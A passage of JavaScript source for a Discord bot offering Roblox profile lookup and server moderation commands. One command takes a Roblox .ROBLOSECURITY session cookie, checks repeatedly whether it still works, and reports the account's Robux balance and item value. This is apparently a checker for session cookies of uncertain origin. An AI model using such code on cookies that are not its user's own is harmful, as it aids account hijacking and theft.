    commandStats.cookieexpiry++;

    await interaction.reply({ content: '🔍 Checking cookie expiry...', ephemeral: true });

    try {
      const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookie}`,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (res.status === 200) {
        // Get detailed Roblox user data
        const robloxData = await getRobloxUserData(cookie);

        // Check if cookie is close to expiry by testing multiple requests
        const testCount = 3;
        let successCount = 0;

        for (let i = 0; i < testCount; i++) {
          try {
            const testRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
              headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
              }
            });
            if (testRes.status === 200) successCount++;
          } catch {}
          await new Promise(resolve => setTimeout(resolve, 500));
        }

        const reliability = (successCount / testCount) * 100;
        let status, color, message;

        if (reliability >= 90) {
          status = '✅ Healthy';
          color = 0x22c55e;
          message = 'Cookie is stable and not expected to expire soon.';
        } else if (reliability >= 70) {
          status = '⚠️ Warning';
          color = 0xfacc15;
          message = 'Cookie may be unstable. Consider refreshing soon.';
        } else {
          status = '❌ Critical';
          color = 0xef4444;
          message = 'Cookie is unreliable and may expire soon. Refresh immediately!';
        }

        const embed = new EmbedBuilder()
          .setColor(color)
          .setTitle(robloxData ? `🎯 ${robloxData.username}` : '🕐 Cookie Expiry Check')
          .setDescription(`🔍 **Cookie Health Monitor**\n${message}`)
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag} • Roblox Tools`,
            iconURL: interaction.user.displayAvatarURL()
          });

        // Add Roblox user info if available
        if (robloxData) {
          if (robloxData.avatar) {
            embed.setThumbnail(robloxData.avatar);
          }
          
          embed.addFields(
            { name: "💰 Robux Balance", value: `\`${robloxData.robux}\``, inline: true },
            { name: "💎 RAP Value", value: `\`${robloxData.rap}\``, inline: true },
            { name: "🆔 User ID", value: `\`${robloxData.userId}\``, inline: true }
          );
        }

        // Add expiry check results
        embed.addFields(
          { name: 'Status', value: status, inline: true },
          { name: 'Reliability', value: `${reliability.toFixed(1)}%`, inline: true },
          { name: 'Recommendation', value: reliability >= 90 ? 'No action needed' : 'Consider refreshing', inline: true }
        );

        await interaction.followUp({ embeds: [embed] });
      } else {
        const embed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle('❌ Cookie Expired')
          .setDescription('The cookie is already invalid or expired.')
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.followUp({ embeds: [embed] });
      }
    } catch (error) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('🚫 Check Failed')
        .setDescription('Unable to check cookie expiry due to network error.')
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'profilelookup') {
    const identifier = interaction.options.getString('identifier');
    commandStats.profilelookup++;

    await interaction.reply({ content: '🔍 Looking up profile...', ephemeral: true });

    try {
      let userId;

      // Check if identifier is a number (user ID) or username
      if (/^\d+$/.test(identifier)) {
        userId = identifier;
      } else {
        // Get user ID from username
        const userRes = await fetch(`https://users.roblox.com/v1/usernames/users`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            usernames: [identifier]
          })
        });

        const userData = await userRes.json();
        if (!userData.data || userData.data.length === 0) {
          const embed = new EmbedBuilder()
            .setColor(0xef4444)
            .setTitle('❌ User Not Found')
            .setDescription('No user found with that username.')
            .setTimestamp()
            .setFooter({
              text: `Requested by ${interaction.user.tag}`,
              iconURL: interaction.user.displayAvatarURL()
            });

          return interaction.followUp({ embeds: [embed] });
        }
        userId = userData.data[0].id;
      }

      // Get detailed user info
      const [userRes, avatarRes] = await Promise.all([
        fetch(`https://users.roblox.com/v1/users/${userId}`),
        fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`)
      ]);

      const userInfo = await userRes.json();
      const avatarInfo = await avatarRes.json();

      if (userRes.status !== 200) {
        const embed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle('❌ User Not Found')
          .setDescription('No user found with that ID.')
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        return interaction.followUp({ embeds: [embed] });
      }

      const embed = new EmbedBuilder()
        .setColor(0x0ea5e9)
        .setTitle(`👤 ${userInfo.displayName} (@${userInfo.name})`)
        .setDescription(userInfo.description || 'No description available')
        .addFields(
          { name: 'User ID', value: `${userInfo.id}`, inline: true },
          { name: 'Username', value: `@${userInfo.name}`, inline: true },
          { name: 'Display Name', value: userInfo.displayName, inline: true },
          { name: 'Created', value: new Date(userInfo.created).toLocaleDateString(), inline: true },
          { name: 'Banned', value: userInfo.isBanned ? '❌ Yes' : '✅ No', inline: true },
          { name: 'Profile Link', value: `[View Profile](https://www.roblox.com/users/${userInfo.id}/profile)`, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      // Add avatar if available
      if (avatarInfo.data && avatarInfo.data.length > 0) {
        embed.setThumbnail(avatarInfo.data[0].imageUrl);
      }

      await interaction.followUp({ embeds: [embed] });
    } catch (error) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('🚫 Lookup Failed')
        .setDescription('Unable to lookup profile due to network error.')
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    }
  }

  // Moderation Commands
  if (interaction.commandName === 'ban') {
    const targetUser = interaction.options.getUser('user');
    const reason = interaction.options.getString('reason') || 'No reason provided';
    commandStats.ban++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);
    
    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '❌ Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    // Check if bot has permission
    if (!interaction.guild.members.me.permissions.has(PermissionFlagsBits.BanMembers)) {
      return interaction.reply({
        content: '❌ I don\'t have permission to ban members.',
        ephemeral: true
      });
    }

    try {
      const member = await interaction.guild.members.fetch(targetUser.id);
      
      // Check if user is trying to ban themselves
      if (targetUser.id === interaction.user.id) {
        return interaction.reply({
          content: '❌ You cannot ban yourself.',
          ephemeral: true
        });
      }

      // Check if user is trying to ban the bot
      if (targetUser.id === client.user.id) {
        return interaction.reply({
          content: '❌ I cannot ban myself.',
          ephemeral: true
        });
      }

      // Check role hierarchy
      if (member.roles.highest.position >= interaction.member.roles.highest.position) {
        return interaction.reply({
          content: '❌ You cannot ban someone with a higher or equal role.',
          ephemeral: true
        });
      }

      await member.ban({ reason });

      const embed = new EmbedBuilder()
        .setColor(0xef4444)
        .setTitle('🔨 User Banned')
        .setDescription(`**${targetUser.tag}** has been banned from the server.`)
        .addFields(
          { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
          { name: 'Reason', value: reason, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `User ID: ${targetUser.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      const reply = await interaction.reply({ embeds: [embed] });
      
      // Auto-delete after 5 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting ban message:', error);
        }
      }, 5000);
    } catch (error) {
      console.error('Ban error:', error);
      await interaction.reply({
        content: '❌ Failed to ban user. They may not be in the server or I lack permissions.',
        ephemeral: true
      });
    }
  }

  if (interaction.commandName === 'kick') {
    const targetUser = interaction.options.getUser('user');
    const reason = interaction.options.getString('reason') || 'No reason provided';
    commandStats.kick++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);
    
    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '❌ Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    // Check if bot has permission
    if (!interaction.guild.members.me.permissions.has(PermissionFlagsBits.KickMembers)) {
      return interaction.reply({
        content: '❌ I don\'t have permission to kick members.',
        ephemeral: true
      });
    }

    try {
      const member = await interaction.guild.members.fetch(targetUser.id);
      
      // Check if user is trying to kick themselves
      if (targetUser.id === interaction.user.id) {
        return interaction.reply({
          content: '❌ You cannot kick yourself.',
          ephemeral: true
        });
      }

      // Check if user is trying to kick the bot
      if (targetUser.id === client.user.id) {
        return interaction.reply({
          content: '❌ I cannot kick myself.',
          ephemeral: true
        });
      }

      // Check role hierarchy
      if (member.roles.highest.position >= interaction.member.roles.highest.position) {
        return interaction.reply({
          content: '❌ You cannot kick someone with a higher or equal role.',
          ephemeral: true
        });
      }

      await member.kick(reason);

      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('👢 User Kicked')
        .setDescription(`**${targetUser.tag}** has been kicked from the server.`)
        .addFields(
          { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
          { name: 'Reason', value: reason, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `User ID: ${targetUser.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      const reply = await interaction.reply({ embeds: [embed] });
      
      // Auto-delete after 5 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting kick message:', error);
        }
      }, 5000);
    } catch (error) {
      console.error('Kick error:', error);
      await interaction.reply({
        content: '❌ Failed to kick user. They may not be in the server or I lack permissions.',
        ephemeral: true
      });
    }
  }

  if (interaction.commandName === 'mute') {
    const targetUser = interaction.options.getUser('user');
    const duration = interaction.options.getInteger('duration');
    const reason = interaction.options.getString('reason') || 'No reason provided';
    commandStats.mute++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);
    
    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '❌ Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    // Check if bot has permission
    if (!interaction.guild.members.me.permissions.has(PermissionFlagsBits.ModerateMembers)) {
      return interaction.reply({
        content: '❌ I don\'t have permission to timeout members.',
        ephemeral: true
      });
    }

    try {
      const member = await interaction.guild.members.fetch(targetUser.id);
      
      // Check if user is trying to mute themselves
      if (targetUser.id === interaction.user.id) {
        return interaction.reply({
          content: '❌ You cannot mute yourself.',
          ephemeral: true
        });
      }

      // Check if user is trying to mute the bot
      if (targetUser.id === client.user.id) {
        return interaction.reply({
          content: '❌ I cannot mute myself.',
          ephemeral: true
        });
      }

      // Check role hierarchy
      if (member.roles.highest.position >= interaction.member.roles.highest.position) {
        return interaction.reply({
          content: '❌ You cannot mute someone with a higher or equal role.',
          ephemeral: true
        });
      }

      const timeoutDuration = duration * 60 * 1000; // Convert minutes to milliseconds
      await member.timeout(timeoutDuration, reason);

      const embed = new EmbedBuilder()
        .setColor(0xff6b6b)
        .setTitle('🔇 User Muted')
        .setDescription(`**${targetUser.tag}** has been muted for ${duration} minutes.`)
        .addFields(
          { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
          { name: 'Duration', value: `${duration} minutes`, inline: true },
          { name: 'Reason', value: reason, inline: false }
        )
        .setTimestamp()
        .setFooter({
          text: `User ID: ${targetUser.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      const reply = await interaction.reply({ embeds: [embed] });
      
      // Auto-delete after 5 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting mute message:', error);
        }
      }, 5000);
    } catch (error) {
      console.error('Mute error:', error);
      await interaction.reply({
        content: '❌ Failed to mute user. They may not be in the server or I lack permissions.',
        ephemeral: true
      });
    }
  }

  if (interaction.commandName === 'unmute') {
    const targetUser = interaction.options.getUser('user');
    const reason = interaction.options.getString('reason') || 'No reason provided';
    commandStats.unmute++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);
    
    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '❌ Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    // Check if bot has permission
    if (!interaction.guild.members.me.permissions.has(PermissionFlagsBits.ModerateMembers)) {
      return interaction.reply({
        content: '❌ I don\'t have permission to remove timeouts.',
        ephemeral: true
      });
    }

    try {
      const member = await interaction.guild.members.fetch(targetUser.id);
      
      if (!member.isCommunicationDisabled()) {
        return interaction.reply({
          content: '❌ This user is not currently muted.',
          ephemeral: true
        });
      }

      await member.timeout(null, reason);

      const embed = new EmbedBuilder()
        .setColor(0x4caf50)
        .setTitle('🔊 User Unmuted')
        .setDescription(`**${targetUser.tag}** has been unmuted.`)
        .addFields(
          { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
          { name: 'Reason', value: reason, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `User ID: ${targetUser.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      const reply = await interaction.reply({ embeds: [embed] });
      
      // Auto-delete after 5 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting unmute message:', error);
        }
      }, 5000);
    } catch (error) {
      console.error('Unmute error:', error);
      await interaction.reply({
        content: '❌ Failed to unmute user. They may not be in the server or I lack permissions.',
        ephemeral: true
      });
    }
  }

  if (interaction.commandName === 'warn') {
    const targetUser = interaction.options.getUser('user');
    const reason = interaction.options.getString('reason');
    commandStats.warn++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);
    
    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '❌ Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    try {
      const member = await interaction.guild.members.fetch(targetUser.id);
      
      // Check if user is trying to warn themselves
      if (targetUser.id === interaction.user.id) {
        return interaction.reply({
          content: '❌ You cannot warn yourself.',
          ephemeral: true
        });
      }

      // Check if user is trying to warn the bot
      if (targetUser.id === client.user.id) {
        return interaction.reply({
          content: '❌ You cannot warn me.',
          ephemeral: true
        });
      }

      // Send DM to the warned user
      try {
        const dmEmbed = new EmbedBuilder()
          .setColor(0xfacc15)
          .setTitle('⚠️ Warning Received')
          .setDescription(`You have received a warning in **${interaction.guild.name}**.`)
          .addFields(
            { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
            { name: 'Reason', value: reason, inline: false }
          )
          .setTimestamp();

        await targetUser.send({ embeds: [dmEmbed] });
      } catch (dmError) {
        console.log('Could not send DM to user');
      }

      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('⚠️ User Warned')
        .setDescription(`**${targetUser.tag}** has been warned.`)
        .addFields(
          { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
          { name: 'Reason', value: reason, inline: false }
        )
        .setTimestamp()
        .setFooter({
          text: `User ID: ${targetUser.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      const reply = await interaction.reply({ embeds: [embed] });
      
      // Auto-delete after 5 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting warn message:', error);
        }
      }, 5000);
    } catch (error) {
      console.error('Warn error:', error);
      await interaction.reply({
        content: '❌ Failed to warn user. They may not be in the server.',
        ephemeral: true
      });
    }
  }
});

client.login(process.env.BOT_TOKEN);
